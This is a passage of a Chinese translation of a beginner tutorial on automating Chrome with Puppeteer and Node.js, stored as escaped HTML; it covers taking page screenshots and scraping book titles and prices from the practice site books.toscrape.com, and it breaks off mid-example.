Morelli\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e译文出自：\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e本文永久链接：\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner/blob/master/TODO/a-guide-to-automating-scraping-the-web-with-javascript-chrome-puppeteer-node-js.md\"\u003ehttps://github.com/xitu/gold-miner/blob/master/TODO/a-guide-to-automating-scraping-the-web-with-javascript-chrome-puppeteer-node-js.md\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e译者：\u003ca target=\"_blank\" href=\"https://github.com/pot-code\"\u003epot-code\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e校对者：\u003ca target=\"_blank\" href=\"https://github.com/bambooom\"\u003ebambooom\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003ch1 class=\"heading\"\u003eJavaScript 自动化爬虫入门指北（Chrome + Puppeteer + Node JS）\u003c/h1\u003e\n\u003ch2 class=\"heading\"\u003e和 Headless Chrome 一起装逼一起飞\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0ef5386ef345?w=290\u0026amp;h=422\u0026amp;f=png\u0026amp;s=14169\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codeburst.io/udemys-black-friday-sale-starts-today-all-web-development-courses-just-10-44966e590bd4\"\u003e\u003cstrong\u003eUdemy Black Friday Sale\u003c/strong\u003e\u003c/a\u003e — Thousands of Web Development \u0026amp; Software Development courses are on sale for only $10 for a limited time! \u003ca target=\"_blank\" href=\"https://codeburst.io/udemys-black-friday-sale-starts-today-all-web-development-courses-just-10-44966e590bd4\"\u003e\u003cstrong\u003eFull details and course recommendations can be found here\u003c/strong\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch4 class=\"heading\"\u003e内容简介\u003c/h4\u003e\n\u003cp\u003e本文将会教你如何用 JavaScript 自动化 web 爬虫，技术上用到了 Google 团队开发的 Puppeteer。 \u003ca target=\"_blank\" href=\"https://github.com/GoogleChrome/puppeteer\"\u003e\u003cstrong\u003ePuppeteer\u003c/strong\u003e\u003c/a\u003e 运行在 Node 环境，可以用来操作 headless Chrome。何谓 \u003ca target=\"_blank\" href=\"https://developers.google.com/web/updates/2017/04/headless-chrome\"\u003e\u003cstrong\u003eHeadless Chrome\u003c/strong\u003e\u003c/a\u003e？通俗来讲就是在不打开 Chrome 浏览器的情况下使用提供的 API 模拟用户的浏览行为。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e如果你还是不理解，你可以想象成使用 JavaScript 全自动化操作 Chrome 浏览器。\u003c/strong\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e前言\u003c/h4\u003e\n\u003cp\u003e先确保你已经安装了 Node 8 及以上的版本，没有的话，可以先到 \u003ca target=\"_blank\" href=\"https://nodejs.org/en/\"\u003e\u003cstrong\u003e官网\u003c/strong\u003e\u003c/a\u003e 里下载安装。注意，一定要选“Current”处显示的版本号大于 8 的。\u003c/p\u003e\n\u003cp\u003e如果你是第一次接触 Node，最好先看一下入门教程：\u003ca target=\"_blank\" href=\"https://codeburst.io/learn-node-js-the-3-best-online-node-js-courses-87e5841f4c47\"\u003e\u003cstrong\u003eLearn Node JS — The 3 Best Online Node JS Courses\u003c/strong\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003e安装好 Node 之后，创建一个项目文件夹，然后安装 Puppeteer。安装 Puppeteer 的过程中会附带下载匹配版本的 Chromium（译者注：国内网络环境可能会出现安装失败的问题，可以设置环境变量 \u003ccode\u003ePUPPETEER_SKIP_CHROMIUM_DOWNLOAD = 1\u003c/code\u003e 跳过下载，副作用是每次使用 \u003ccode\u003elaunch\u003c/code\u003e 方法时，需要手动指定浏览器的执行路径）：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003enpm install --save puppeteer\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e例 1 —— 网页截图\u003c/h4\u003e\n\u003cp\u003ePuppeteer 安装好之后，我们就可以开始写一个简单的例子。这个例子直接照搬自官方文档，它可以对给定的网站进行截图。\u003c/p\u003e\n\u003cp\u003e首先创建一个 js 文件，名字随便起，这里我们用 \u003ccode\u003etest.js\u003c/code\u003e 作为示例，输入以下代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e puppeteer = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'puppeteer'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003egetPic\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e browser = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e puppeteer.launch();\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e page = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e browser.newPage();\n  \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.goto(\u003cspan class=\"hljs-string\"\u003e'https://google.com'\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.screenshot({\u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'google.png'\u003c/span\u003e});\n\n  \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e browser.close();\n}\n\ngetPic();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e下面我们来逐行分析上面的代码。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e第 1 行：\u003c/strong\u003e 引入依赖。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e第 3–10 行：\u003c/strong\u003e 核心代码，自动化过程在这里完成。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e第 12 行：\u003c/strong\u003e 执行 \u003ccode\u003egetPic()\u003c/code\u003e 方法。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e细心的读者会发现，\u003ccode\u003egetPic()\u003c/code\u003e 前面有个 \u003ccode\u003easync\u003c/code\u003e 前缀，它表示 \u003ccode\u003egetPic()\u003c/code\u003e 方法是个异步方法。\u003ccode\u003easync\u003c/code\u003e 和 \u003ccode\u003eawait\u003c/code\u003e 成对出现，属于 ES 2017 新特性。介于它是个异步方法，所以调用之后返回的是 \u003ccode\u003ePromise\u003c/code\u003e 对象。当 \u003ccode\u003easync\u003c/code\u003e 方法返回值时，对应的 \u003ccode\u003ePromise\u003c/code\u003e 对象会将这个值传递给 \u003ccode\u003eresolve\u003c/code\u003e（如果抛出异常，那么会将错误信息传递给 \u003ccode\u003eReject\u003c/code\u003e)。\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003easync\u003c/code\u003e 方法中，可以使用 \u003ccode\u003eawait\u003c/code\u003e 表达式暂停方法的执行，直到表达式里的 \u003ccode\u003ePromise\u003c/code\u003e 对象完全解析之后再继续向下执行。看不懂没关系，后面我再详细讲解，到时候你就明白了。\u003c/p\u003e\n\u003cp\u003e接下来，我们将会深入分析 \u003ccode\u003egetPic()\u003c/code\u003e 方法：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e第 4 行：\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e browser = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e puppeteer.launch();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这段代码用于启动 puppeteer，实质上打开了一个 Chrome 的实例，然后将这个实例对象赋给变量 \u003ccode\u003ebrowser\u003c/code\u003e。因为使用了 \u003ccode\u003eawait\u003c/code\u003e 关键字，代码运行到这里会阻塞（暂停），直到 \u003ccode\u003ePromise\u003c/code\u003e 解析完毕（无论执行结果是否成功）\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e第 5 行：\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e page = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e browser.newPage();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来，在上文获取到的浏览器实例中新建一个页面，等到其返回之后将新建的页面对象赋给变量 \u003ccode\u003epage\u003c/code\u003e。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e第 6 行：\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.goto(\u003cspan class=\"hljs-string\"\u003e'https://google.com'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e使用上文获取到的 \u003ccode\u003epage\u003c/code\u003e 对象，用它来加载我们给的 URL 地址，随后代码暂停执行，等待页面加载完毕。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e第 7 行：\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.screenshot({\u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'google.png'\u003c/span\u003e});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e等到页面加载完成之后，就可以对页面进行截图了。\u003ccode\u003escreenshot()\u003c/code\u003e 方法接受一个对象参数，可以用来配置截图保存的路径。注意，不要忘了加上 \u003ccode\u003eawait\u003c/code\u003e 关键字。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e第 9 行：\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e browser.close();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后，关闭浏览器。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e运行示例\u003c/h4\u003e\n\u003cp\u003e在命令行输入以下命令执行示例代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003enode test.js\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以下是示例里的截图结果：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0ef4b3de688b?w=800\u0026amp;h=601\u0026amp;f=png\u0026amp;s=33261\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e是不是很厉害？这只是热身，下面教你怎么在非 headless 环境下运行代码。\u003c/p\u003e\n\u003cp\u003e非 headless？百闻不如一见，自己先动手试一下吧，把第 4 行的代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e browser = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e puppeteer.launch();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e换成这句：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e browser = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e puppeteer.launch({\u003cspan class=\"hljs-attr\"\u003eheadless\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后再次运行：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003enode test.js\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e是不是更炫酷了？当配置了 \u003ccode\u003e{headless: false}\u003c/code\u003e 之后，就可以直观的看到代码是怎么操控 Chrome 浏览器的。\u003c/p\u003e\n\u003cp\u003e这里还有一个小问题，之前我们的截图有点没截完整的感觉，那是因为 \u003ccode\u003epage\u003c/code\u003e 对象默认的截屏尺寸有点小的缘故，我们可以通过下面的代码重新设置 \u003ccode\u003epage\u003c/code\u003e 的视口大小，然后再截取：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.setViewport({\u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这下就好多了：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0ef4b15632f3?w=800\u0026amp;h=404\u0026amp;f=png\u0026amp;s=32595\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e最终代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e puppeteer = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'puppeteer'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003egetPic\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e browser = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e puppeteer.launch({\u003cspan class=\"hljs-attr\"\u003eheadless\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e});\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e page = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e browser.newPage();\n  \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.goto(\u003cspan class=\"hljs-string\"\u003e'https://google.com'\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.setViewport({\u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e})\n  \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.screenshot({\u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'google.png'\u003c/span\u003e});\n\n  \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e browser.close();\n}\n\ngetPic();\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e例 2 —— 爬取数据\u003c/h4\u003e\n\u003cp\u003e通过上面的例子，你应该掌握了 Puppeteer 的基本用法，下面再来看一个稍微复杂点的例子。\u003c/p\u003e\n\u003cp\u003e开始前，不妨先看看 \u003ca target=\"_blank\" href=\"https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md#\"\u003e官方文档\u003c/a\u003e。你会发现 Puppeteer 能干很多事，像是模拟鼠标的点击、填充表单数据、输入文字、读取页面数据等。\u003c/p\u003e\n\u003cp\u003e在接下来的教程里，我们将爬一个叫 \u003ca target=\"_blank\" href=\"http://books.toscrape.com/\"\u003e\u003cem\u003eBooks To Scrape\u003c/em\u003e\u003c/a\u003e 的网站，这个网站是专门用来给开发者做爬虫练习用的。\u003c/p\u003e\n\u003cp\u003e还是在之前创建的文件夹里，新建一个 js 文件，这里用 \u003ccode\u003escrape.js\u003c/code\u003e 作为示例，然后输入以下代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e puppeteer = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'puppeteer'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e scrape = \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e () =\u0026gt; {\n  \u003cspan class=\"hljs-comment\"\u003e// Actual Scraping goes Here...\u003c/span\u003e\n  \n  \u003cspan class=\"hljs-comment\"\u003e// Return a value\u003c/span\u003e\n};\n\nscrape().then(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003evalue\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(value); \u003cspan class=\"hljs-comment\"\u003e// Success!\u003c/span\u003e\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e有了上一个例子的经验，这段代码要看懂应该不难。如果你还是看不懂的话......那也没啥问题就是了。\u003c/p\u003e\n\u003cp\u003e首先，还是引入 \u003ccode\u003epuppeteer\u003c/code\u003e 依赖，然后定义一个 \u003ccode\u003escrape()\u003c/code\u003e 方法，用来写爬虫代码。这个方法返回一个值，到时候我们会处理这个返回值（示例代码是直接打印出这个值）\u003c/p\u003e\n\u003cp\u003e先在 scrape 方法中添加下面这一行测试一下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e scrape = \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e () =\u0026gt; {\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'test'\u003c/span\u003e;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在命令行输入 \u003ccode\u003enode scrape.js\u003c/code\u003e，不出问题的话，控制台会打印一个 \u003ccode\u003etest\u003c/code\u003e 字符串。测试通过后，我们来继续完善 \u003ccode\u003escrape\u003c/code\u003e 方法。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e步骤 1：前期准备\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e和例 1 一样，先获取浏览器实例，再新建一个页面，然后加载 URL：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e scrape = \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e () =\u0026gt; {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e browser = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e puppeteer.launch({\u003cspan class=\"hljs-attr\"\u003eheadless\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e});\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e page = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e browser.newPage();\n  \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.goto(\u003cspan class=\"hljs-string\"\u003e'http://books.toscrape.com/'\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.waitFor(\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e);\n  \u003cspan class=\"hljs-comment\"\u003e// Scrape\u003c/span\u003e\n  browser.close();\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e result;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e再来分析一下上面的代码：\u003c/p\u003e\n\u003cp\u003e首先，我们创建了一个浏览器实例，将 \u003ccode\u003eheadless\u003c/code\u003e 设置为 \u003ccode\u003efalse\u003c/code\u003e，这样就能直接看到浏览器的操作过程：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e browser = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e puppeteer.launch({\u003cspan class=\"hljs-attr\"\u003eheadless\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后创建一个新标签页：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e page = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e browser.newPage();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e访问 \u003ccode\u003ebooks.toscrape.com\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.goto(\u003cspan class=\"hljs-string\"\u003e'http://books.toscrape.com/'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e下面这一步可选，让代码暂停执行 1 秒，保证页面能完全加载完毕：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.waitFor(\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e任务完成之后关闭浏览器，返回执行结果。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ebrowser.close();\n\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e result;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e步骤 1 结束。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e步骤 2： 开爬\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e打开 Books to Scrape 网站之后，想必你也发现了，这里面有海量的书籍，只是数据都是假的而已。先从简单的开始，我们先抓取页面里第一本书的数据，返回它的标题和价格信息（红色边框选中的那本）。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0ef4c063a6b0?w=1000\u0026amp;h=584\u0026amp;f=png\u0026amp;s=126304\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e查一下文档，注意到这个方法能模拟页面点击：\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003epage.click(selector[, options])\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eselector\u003c/code\u003e  选择器，定位需要进行点击的元素，如果有多个元素匹配，以第一个为准。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e这里可以使用开发者工具查看元素的选择器，在图片上右击选中 inspect：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0ef5541226fc?w=800\u0026amp;h=620\u0026amp;f=png\u0026amp;s=186811\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e上面的操作会打开开发者工具栏，之前选中的元素也会被高亮显示，这个时候点击前面的三个小点，选择 copy - copy selector：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0ef4c1ea2791?w=1000\u0026amp;h=588\u0026amp;f=png\u0026amp;s=195043\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e有了元素的选择器之后，再加上之前查到的元素点击方法，得到如下代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.click(\u003cspan class=\"hljs-string\"\u003e'#default \u0026gt; div \u0026gt; div \u0026gt; div \u0026gt; div \u0026gt; section \u0026gt; div:nth-child(2) \u0026gt; ol \u0026gt; li:nth-child(1) \u0026gt; article \u0026gt; div.image_container \u0026gt; a \u0026gt; img'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后就会观察到浏览器点击了第一本书的图片，页面也会跳转到详情页。\u003c/p\u003e\n\u003cp\u003e在详情页里，我们只关心书的标题和价格信息 —— 见图中红框标注。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0ef4b60a1056?w=800\u0026amp;h=653\u0026amp;f=png\u0026amp;s=187764\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e为了获取这些数据，需要用到 \u003ccode\u003epage.evaluate()\u003c/code\u003e 方法。这个方法可以用来执行浏览器内置 DOM API ，例如 \u003ccode\u003equerySelector()\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e首先创建 \u003ccode\u003epage.evaluate()\u003c/code\u003e 方法，将其返回值保存在 \u003ccode\u003eresult\u003c/code\u003e 变量中：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e result = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.evaluate(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n\u003cspan class=\"hljs-comment\"\u003e// return something\u003c/span\u003e\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e同样，要在方法里选择我们要用到的元素，再次打开开发者工具，选择需要 inspect 的元素：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0ef5337cf0dc?w=1000\u0026amp;h=317\u0026amp;f=png\u0026amp;s=128377\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e标题是个简单的 \u003ccode\u003eh1\u003c/code\u003e 元素，使用下面的代码获取：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e title = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.querySelector(\u003cspan class=\"hljs-string\"\u003e'h1'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其实我们需要的只是元素里的文字部分，可以在后面加上 \u003ccode\u003e.innerText\u003c/code\u003e，代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e title = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.querySelector(\u003cspan class=\"hljs-string\"\u003e'h1'\u003c/span\u003e).innerText;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e获取价格信息同理：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0ef53beed060?w=1000\u0026amp;h=382\u0026amp;f=png\u0026amp;s=168564\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e刚好价格元素上有个 \u003ccode\u003eprice_color\u003c/code\u003e class，可以用这个 class 作为选择器获取到价格对应的元素：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan 